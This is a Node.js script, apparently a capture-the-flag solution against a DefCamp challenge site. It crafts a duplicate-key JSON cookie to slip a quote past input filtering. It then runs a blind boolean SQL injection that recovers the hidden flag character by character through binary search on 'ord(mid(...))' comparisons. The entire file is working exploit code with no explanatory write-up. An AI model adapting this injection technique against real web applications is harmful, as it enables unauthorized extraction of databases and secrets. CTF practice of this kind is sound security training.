const axios = require('axios');

// maybe: select name from table where flair = '$1'

const go = (flair) => {
    let dump = JSON.stringify({
        // flair: '1',
        flair,
    });
    dump = `{"flair":"'","flair":${JSON.stringify(flair)},"flair2":"'"}`;
    console.log(`prefs=${dump}`);

    return axios({
        url: 'https://secops.dctfq18.def.camp/',
        headers: {
            cookie: `prefs=${dump}`,
        },
    }).then((response) => {
        let data = response.data;
        data = data.replace(/\s+/g, ' ');
        const pos = data.indexOf('Hacker flair</h3>');
        if (pos !== -1) {
            data = data.slice(pos - 20, pos + 80);
        }
        console.log(data);
        return data;
    }).catch((err) => {
        // console.error(err.response.status);
        // console.error(err.response.data);
        return false;
    });
};

const check = async (pos, v) => {
    const data = await go(`4' and ord(mid(flag,${pos+1},1))>${v} and 1='1`);
    return data && data.indexOf('Flag!') !== -1;
};

const search = async (pos) => {
    let lo = 0;
    let hi = 255;

    let mid;
    while (hi > lo) {
        mid = (hi + lo) / 2 | 0;
        const v = await check(pos, mid);
        if (!v) {
            hi = mid;
        } else {
            lo = mid + 1;
        }
    }

    let repeat = true;
    while (repeat) {
        repeat = false;

        const v = await check(pos, mid);
        if (v) {
            mid++;
            repeat = true;
        }
    }

    console.log({
        pos,
        v: mid
    })
    return String.fromCharCode(mid);
}


(async () => {

    const flair = process.argv[2];
    go(flair);

    // let flag = '';
    // for (let i = 0; i < 70; i++) {
    //     const c = await search(i);
    //     flag += c;
    //     console.log(flag);
    // }

})();